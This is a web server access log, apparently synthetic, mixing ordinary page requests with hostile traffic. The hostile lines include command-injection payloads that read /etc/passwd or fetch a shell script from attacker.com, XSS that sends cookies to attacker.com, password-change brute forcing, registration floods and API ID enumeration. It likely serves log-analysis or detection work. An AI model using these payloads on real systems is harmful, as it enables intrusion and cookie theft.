91.240.118.222 - - [01/Jun/2025:21:00:00 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 500 413 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:00 +0000] "CONNECT /login HTTP/1.1" 405 863 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:16 +0000] "DELETE /config HTTP/1.1" 200 754 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
91.240.118.222 - - [01/Jun/2025:21:00:17 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 200 576 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:00:20 +0000] "DELETE /users/1 HTTP/1.1" 200 705 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.32.162.44 - - [01/Jun/2025:21:00:24 +0000] "TRACE /index.html HTTP/1.1" 405 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
89.207.132.170 - - [01/Jun/2025:21:00:27 +0000] "GET /page?id=javascript:alert(1) HTTP/1.1" 200 1977 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:33 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 200 1796 "-" "curl/7.68.0"
89.207.132.170 - - [01/Jun/2025:21:00:34 +0000] "GET /profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1" 500 1812 "-" "curl/7.68.0"
89.207.132.170 - - [01/Jun/2025:21:00:36 +0000] "GET /comment?text=<img+src=x+onerror=alert(document.cookie)> HTTP/1.1" 200 230 "-" "curl/7.68.0"
91.240.118.222 - - [01/Jun/2025:21:00:50 +0000] "GET /search?q=test|id HTTP/1.1" 200 1381 "-" "curl/7.68.0"
193.32.162.44 - - [01/Jun/2025:21:01:00 +0000] "PUT /static/app.js HTTP/1.1" 405 690 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:21:01:02 +0000] "GET /blog HTTP/1.1" 200 2954 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.240.118.222 - - [01/Jun/2025:21:01:12 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 200 1466 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:21:01:13 +0000] "GET /products HTTP/1.1" 200 2541 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
195.23.11.8 - - [01/Jun/2025:21:01:55 +0000] "GET /products HTTP/1.1" 200 2954 "-" "Wget/1.21"
188.37.240.1 - - [01/Jun/2025:21:03:26 +0000] "GET /contact HTTP/1.1" 200 912 "-" "curl/7.68.0"
188.37.240.1 - - [01/Jun/2025:21:03:42 +0000] "GET /favicon.ico HTTP/1.1" 200 1907 "-" "python-requests/2.28.0"
188.37.240.1 - - [01/Jun/2025:21:06:37 +0000] "POST /index.html HTTP/1.1" 200 4378 "-" "python-requests/2.28.0"
85.241.12.44 - - [01/Jun/2025:21:09:38 +0000] "GET / HTTP/1.1" 200 10074 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:21:14:51 +0000] "POST /blog/post-1 HTTP/1.1" 200 13187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:21:15:35 +0000] "GET /favicon.ico HTTP/1.1" 200 3623 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:21:19:48 +0000] "GET /static/css/main.css HTTP/1.1" 200 998 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:21:20:25 +0000] "GET /favicon.ico HTTP/1.1" 200 3673 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:21:22:09 +0000] "GET / HTTP/1.1" 200 9393 "-" "Wget/1.21"
91.152.3.77 - - [01/Jun/2025:21:28:23 +0000] "POST /blog/post-1 HTTP/1.1" 200 3178 "-" "python-requests/2.28.0"
188.37.240.1 - - [01/Jun/2025:21:38:38 +0000] "GET / HTTP/1.1" 304 11344 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:21:40:11 +0000] "POST /robots.txt HTTP/1.1" 200 8645 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:21:43:11 +0000] "POST /favicon.ico HTTP/1.1" 304 10695 "-" "Mozilla/5.0 (X11; Linux x86_64)"
188.37.240.1 - - [01/Jun/2025:21:45:08 +0000] "GET /sitemap.xml HTTP/1.1" 200 4847 "-" "python-requests/2.28.0"
85.241.12.44 - - [01/Jun/2025:21:45:10 +0000] "GET /sitemap.xml HTTP/1.1" 200 7229 "-" "Wget/1.21"
194.147.78.155 - - [01/Jun/2025:22:00:00 +0000] "GET /ping?host=192.168.1.1;whoami HTTP/1.1" 500 1980 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:00:00 +0000] "DELETE /admin HTTP/1.1" 405 458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 150 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:02 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 98 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:03 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 97 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:06 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 92 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:08 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 86 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:10 +0000] "PUT /static/app.js HTTP/1.1" 403 904 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:12 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 158 "-" "Mozilla/5.0 (X11; Linux x86_64)"
77.81.142.9 - - [01/Jun/2025:22:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 141 "-" "Mozilla/5.0 (X11; Linux x86_64)"
194.147.78.155 - - [01/Jun/2025:22:00:16 +0000] "GET /search?q=test|id HTTP/1.1" 200 1472 "-" "curl/7.68.0"
77.81.142.9 - - [01/Jun/2025:22:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 104 "-" "Mozilla/5.0 (X11; Linux x86_64)"
45.129.56.200 - - [01/Jun/2025:22:00:17 +0000] "DELETE /config HTTP/1.1" 405 951 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
77.81.142.9 - - [01/Jun/2025:22:00:35 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 165 "-" "Mozilla/5.0 (X11; Linux x86_64)"
194.147.78.155 - - [01/Jun/2025:22:00:36 +0000] "GET /exec?cmd=$(wget+http://attacker.com/shell.sh) HTTP/1.1" 500 670 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:00:45 +0000] "TRACE /index.html HTTP/1.1" 405 314 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:00:54 +0000] "DELETE /users/1 HTTP/1.1" 200 864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:00:56 +0000] "TRACK / HTTP/1.1" 403 497 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
45.129.56.200 - - [01/Jun/2025:22:01:06 +0000] "PUT /users/1 HTTP/1.1" 403 885 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
194.147.78.155 - - [01/Jun/2025:22:01:08 +0000] "GET /backup?file=report.pdf;cat+/etc/passwd HTTP/1.1" 500 1091 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:01:08 +0000] "TRACE /admin HTTP/1.1" 200 132 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
194.147.78.155 - - [01/Jun/2025:22:01:09 +0000] "GET /ping?host=127.0.0.1&&uname+-a HTTP/1.1" 500 457 "-" "curl/7.68.0"
45.129.56.200 - - [01/Jun/2025:22:02:40 +0000] "PATCH /dashboard HTTP/1.1" 403 913 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:22:04:02 +0000] "GET /static/js/app.js HTTP/1.1" 200 7363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2.80.17.99 - - [01/Jun/2025:22:04:28 +0000] "POST /products HTTP/1.1" 200 11416 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:22:15:59 +0000] "POST /static/css/main.css HTTP/1.1" 200 11279 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:22:20:13 +0000] "GET /about HTTP/1.1" 200 4315 "-" "python-requests/2.28.0"
195.23.11.8 - - [01/Jun/2025:22:25:17 +0000] "POST /static/css/main.css HTTP/1.1" 200 5194 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:22:29:56 +0000] "POST /blog HTTP/1.1" 304 13927 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:22:34:31 +0000] "POST /contact HTTP/1.1" 200 14329 "-" "Mozilla/5.0 (X11; Linux x86_64)"
2.80.17.99 - - [01/Jun/2025:22:35:21 +0000] "GET /contact HTTP/1.1" 304 4930 "-" "Wget/1.21"
193.136.5.20 - - [01/Jun/2025:22:44:07 +0000] "GET /static/css/main.css HTTP/1.1" 304 3056 "-" "python-requests/2.28.0"
193.136.5.20 - - [01/Jun/2025:22:49:52 +0000] "GET /about HTTP/1.1" 200 13600 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:22:50:08 +0000] "GET / HTTP/1.1" 200 4366 "-" "Wget/1.21"
85.241.12.44 - - [01/Jun/2025:22:50:30 +0000] "POST /static/css/main.css HTTP/1.1" 200 4685 "-" "curl/7.68.0"
193.136.5.20 - - [01/Jun/2025:22:52:32 +0000] "GET /index.html HTTP/1.1" 200 8600 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:22:53:39 +0000] "GET /products HTTP/1.1" 200 11105 "-" "Mozilla/5.0 (X11; Linux x86_64)"
85.241.12.44 - - [01/Jun/2025:22:54:49 +0000] "POST / HTTP/1.1" 200 11872 "-" "Wget/1.21"
2.80.17.99 - - [01/Jun/2025:22:56:10 +0000] "POST /robots.txt HTTP/1.1" 304 2127 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:00 +0000] "PUT /static/app.js HTTP/1.1" 403 593 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 87 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:02 +0000] "GET /api/projects/1 HTTP/1.1" 404 4 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:03 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 147 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:03 +0000] "GET /api/projects/3 HTTP/1.1" 404 55 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:04 +0000] "GET /api/projects/2 HTTP/1.1" 404 79 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:05 +0000] "GET /api/projects/5 HTTP/1.1" 404 2 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:06 +0000] "PATCH /dashboard HTTP/1.1" 403 940 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:06 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 165 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:06 +0000] "GET /api/projects/6 HTTP/1.1" 404 143 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:07 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 133 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:07 +0000] "GET /api/projects/7 HTTP/1.1" 404 136 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:08 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 99 "-" "Mozilla/5.0 (X11; Linux x86_64)"
104.244.76.13 - - [01/Jun/2025:23:00:08 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 145 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:08 +0000] "GET /api/projects/4 HTTP/1.1" 404 1 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:09 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 117 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:09 +0000] "GET /api/projects/9 HTTP/1.1" 404 129 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 173 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:10 +0000] "GET /api/projects/10 HTTP/1.1" 404 125 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:11 +0000] "GET /api/projects/11 HTTP/1.1" 404 88 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:13 +0000] "GET /api/projects/13 HTTP/1.1" 404 35 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:15 +0000] "CONNECT /login HTTP/1.1" 200 600 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:15 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 107 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:15 +0000] "GET /api/projects/15 HTTP/1.1" 404 74 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:17 +0000] "GET /api/projects/17 HTTP/1.1" 404 149 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:18 +0000] "GET /api/projects/18 HTTP/1.1" 404 65 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:19 +0000] "GET /api/projects/19 HTTP/1.1" 404 123 "-" "curl/7.68.0"
104.244.76.13 - - [01/Jun/2025:23:00:20 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 127 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:20 +0000] "GET /api/projects/20 HTTP/1.1" 404 149 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:21 +0000] "GET /api/projects/21 HTTP/1.1" 404 31 "-" "curl/7.68.0"
188.37.240.1 - - [01/Jun/2025:23:00:22 +0000] "GET /static/js/app.js HTTP/1.1" 200 6426 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:24 +0000] "GET /api/projects/8 HTTP/1.1" 404 58 "-" "curl/7.68.0"
176.10.99.200 - - [01/Jun/2025:23:00:24 +0000] "GET /api/projects/12 HTTP/1.1" 404 88 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:32 +0000] "TRACE /index.html HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:00:32 +0000] "GET /api/projects/16 HTTP/1.1" 404 120 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:34 +0000] "TRACE /admin HTTP/1.1" 403 424 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
104.244.76.13 - - [01/Jun/2025:23:00:40 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 182 "-" "Mozilla/5.0 (X11; Linux x86_64)"
176.10.99.200 - - [01/Jun/2025:23:00:42 +0000] "GET /api/projects/14 HTTP/1.1" 404 53 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:23:00:43 +0000] "GET /favicon.ico HTTP/1.1" 200 7871 "-" "Wget/1.21"
176.10.99.200 - - [01/Jun/2025:23:00:46 +0000] "GET /api/projects/23 HTTP/1.1" 404 76 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:00:48 +0000] "PUT /users/1 HTTP/1.1" 403 673 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
176.10.99.200 - - [01/Jun/2025:23:01:06 +0000] "GET /api/projects/22 HTTP/1.1" 404 98 "-" "curl/7.68.0"
91.108.56.181 - - [01/Jun/2025:23:01:15 +0000] "TRACK / HTTP/1.1" 200 347 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
193.136.5.20 - - [01/Jun/2025:23:07:52 +0000] "GET /index.html HTTP/1.1" 200 10730 "-" "curl/7.68.0"
91.152.3.77 - - [01/Jun/2025:23:12:31 +0000] "GET /static/js/app.js HTTP/1.1" 200 3357 "-" "Wget/1.21"
195.23.11.8 - - [01/Jun/2025:23:18:01 +0000] "GET /favicon.ico HTTP/1.1" 404 1379 "-" "Wget/1.21"
188.37.240.1 - - [01/Jun/2025:23:25:53 +0000] "POST / HTTP/1.1" 304 14664 "-" "python-requests/2.28.0"
85.241.12.44 - - [01/Jun/2025:23:36:38 +0000] "POST /robots.txt HTTP/1.1" 200 14987 "-" "curl/7.68.0"
195.23.11.8 - - [01/Jun/2025:23:37:30 +0000] "GET /products/1 HTTP/1.1" 200 13329 "-" "python-requests/2.28.0"
195.23.11.8 - - [01/Jun/2025:23:39:16 +0000] "GET /products HTTP/1.1" 200 10800 "-" "python-requests/2.28.0"
91.152.3.77 - - [01/Jun/2025:23:40:32 +0000] "GET /static/css/main.css HTTP/1.1" 200 824 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
85.241.12.44 - - [01/Jun/2025:23:48:52 +0000] "GET /robots.txt HTTP/1.1" 200 3666 "-" "python-requests/2.28.0"
188.37.240.1 - - [01/Jun/2025:23:53:06 +0000] "GET /static/js/app.js HTTP/1.1" 200 14223 "-" "curl/7.68.0"
2.80.17.99 - - [01/Jun/2025:23:57:25 +0000] "POST /products HTTP/1.1" 304 4512 "-" "Wget/1.21"
2.80.17.99 - - [01/Jun/2025:23:57:48 +0000] "GET /contact HTTP/1.1" 200 3659 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.152.3.77 - - [01/Jun/2025:23:59:41 +0000] "GET /robots.txt HTTP/1.1" 200 4810 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:00 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 188 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:00 +0000] "POST /api/auth/register HTTP/1.1" 409 196 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:02 +0000] "GET /api/tasks/1 HTTP/1.1" 404 81 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:03 +0000] "POST /api/auth/register HTTP/1.1" 409 181 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:05 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 125 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:05 +0000] "POST /api/auth/register HTTP/1.1" 409 151 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:06 +0000] "GET /api/tasks/2 HTTP/1.1" 404 28 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:06 +0000] "GET /api/tasks/3 HTTP/1.1" 404 50 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:06 +0000] "GET /api/tasks/6 HTTP/1.1" 404 24 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:06 +0000] "POST /api/auth/register HTTP/1.1" 409 195 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:07 +0000] "GET /api/tasks/7 HTTP/1.1" 404 127 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:07 +0000] "POST /api/auth/register HTTP/1.1" 409 179 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:08 +0000] "GET /api/tasks/8 HTTP/1.1" 404 117 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:08 +0000] "POST /api/auth/register HTTP/1.1" 400 186 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:09 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 199 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:09 +0000] "POST /api/auth/register HTTP/1.1" 400 194 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 125 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 99 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:10 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 176 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:10 +0000] "GET /api/tasks/10 HTTP/1.1" 404 40 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:11 +0000] "GET /api/tasks/11 HTTP/1.1" 404 37 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:12 +0000] "GET /api/tasks/4 HTTP/1.1" 404 108 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:12 +0000] "POST /api/auth/register HTTP/1.1" 400 152 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:15 +0000] "GET /api/tasks/5 HTTP/1.1" 404 12 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:16 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 101 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 181 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:18 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 100 "-" "Mozilla/5.0 (X11; Linux x86_64)"
91.219.236.4 - - [02/Jun/2025:00:00:20 +0000] "POST /api/auth/register HTTP/1.1" 409 98 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:26 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 144 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:26 +0000] "GET /api/tasks/13 HTTP/1.1" 404 50 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:27 +0000] "GET /api/tasks/9 HTTP/1.1" 404 59 "-" "curl/7.68.0"
5.188.10.180 - - [02/Jun/2025:00:00:28 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 194 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:33 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 134 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:36 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 116 "-" "Mozilla/5.0 (X11; Linux x86_64)"
5.188.10.180 - - [02/Jun/2025:00:00:36 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 113 "-" "Mozilla/5.0 (X11; Linux x86_64)"
62.171.137.5 - - [02/Jun/2025:00:00:36 +0000] "GET /api/tasks/12 HTTP/1.1" 404 103 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:36 +0000] "POST /api/auth/register HTTP/1.1" 400 100 "-" "python-requests/2.28.0"
5.188.10.180 - - [02/Jun/2025:00:00:40 +0000] "PATCH /api/users/me/password HTTP/1.1" 400 175 "-" "Mozilla/5.0 (X11; Linux x86_64)"
194.61.24.9 - - [02/Jun/2025:01:00:00 +0000] "POST /api/auth/register HTTP/1.1" 409 155 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:02 +0000] "GET /api/tasks/1 HTTP/1.1" 404 137 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:03 +0000] "POST /api/auth/register HTTP/1.1" 400 102 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:03 +0000] "POST /api/auth/register HTTP/1.1" 409 82 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:04 +0000] "GET /api/tasks/2 HTTP/1.1" 404 70 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:04 +0000] "GET /api/tasks/4 HTTP/1.1" 404 44 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:05 +0000] "POST /api/auth/register HTTP/1.1" 409 182 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:07 +0000] "GET /api/tasks/7 HTTP/1.1" 404 87 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:07 +0000] "POST /api/auth/register HTTP/1.1" 409 93 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:08 +0000] "POST /api/auth/register HTTP/1.1" 400 114 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:08 +0000] "POST /api/auth/register HTTP/1.1" 400 161 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:09 +0000] "GET /api/tasks/3 HTTP/1.1" 404 56 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:12 +0000] "GET /api/tasks/6 HTTP/1.1" 404 110 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:12 +0000] "POST /api/auth/register HTTP/1.1" 400 137 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:13 +0000] "POST /api/auth/register HTTP/1.1" 400 103 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:15 +0000] "GET /api/tasks/5 HTTP/1.1" 404 54 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 151 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:18 +0000] "GET /api/tasks/9 HTTP/1.1" 404 143 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:18 +0000] "POST /api/auth/register HTTP/1.1" 400 102 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:18 +0000] "POST /api/auth/register HTTP/1.1" 400 133 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:20 +0000] "GET /api/tasks/10 HTTP/1.1" 404 17 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:24 +0000] "GET /api/tasks/8 HTTP/1.1" 404 20 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:30 +0000] "POST /api/auth/register HTTP/1.1" 409 142 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:44 +0000] "POST /api/auth/register HTTP/1.1" 400 161 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:56 +0000] "POST /api/auth/register HTTP/1.1" 409 110 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:00 +0000] "POST /api/auth/register HTTP/1.1" 400 103 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:02 +0000] "POST /api/auth/register HTTP/1.1" 400 163 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:06 +0000] "POST /api/auth/register HTTP/1.1" 400 103 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:09 +0000] "POST /api/auth/register HTTP/1.1" 400 144 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:09 +0000] "POST /api/auth/register HTTP/1.1" 409 80 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:10 +0000] "POST /api/auth/register HTTP/1.1" 400 186 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:12 +0000] "POST /api/auth/register HTTP/1.1" 409 114 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:15 +0000] "POST /api/auth/register HTTP/1.1" 400 197 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 96 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:21 +0000] "POST /api/auth/register HTTP/1.1" 409 82 "-" "python-requests/2.28.0"
